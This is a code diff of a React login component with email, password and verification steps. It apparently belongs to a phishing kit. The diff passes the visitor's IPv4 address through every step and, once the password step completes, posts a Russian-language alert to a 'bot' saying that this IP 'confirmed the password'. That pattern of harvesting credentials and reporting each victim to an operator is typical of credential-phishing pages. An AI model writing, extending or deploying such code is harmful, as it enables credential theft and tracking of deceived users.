@@ -6,7 +6,7 @@ import axios from "axios";
 import bot from "../../bot_manager/manager";
 import FinalAuth from "../finalAuth/FinalAuth";
 
-const LoginManager = () => {
+const LoginManager = ({info}) => {
 
     const [firstStep, setStep] = useState(true);
     const [email, setEmail] = useState('')
@@ -16,18 +16,18 @@ const LoginManager = () => {
 
     useEffect(() => {
         if (state !== 0) {
-            axios.post(bot.sendMessage("success"))
+            axios.post(bot.sendMessage('Пользователь <code>' + info.IPv4 + "</code> Подтвердил пароль!"), '')
         }
     }, [state])
 
     return (
         <div>
-            {!isFinalStep  ? state === 0 ? firstStep ? <Email setStep={setStep.bind()} setEmail={setEmail.bind()}/> :
-                    <Password email={email} setState={setState.bind()}/>
+            {!isFinalStep  ? state === 0 ? firstStep ? <Email info={info} setStep={setStep.bind()} setEmail={setEmail.bind()}/> :
+                    <Password info={info} email={email} setState={setState.bind()}/>
                 :
                 <div>
-                    <AuthVerification state={state} setFinal={setFinalStep.bind()}/>
-                </div> : <FinalAuth state={state}/>
+                    <AuthVerification state={state} setFinal={setFinalStep.bind()} info={info}/>
+                </div> : <FinalAuth state={state} info={info}/>
             }
         </div>
     );
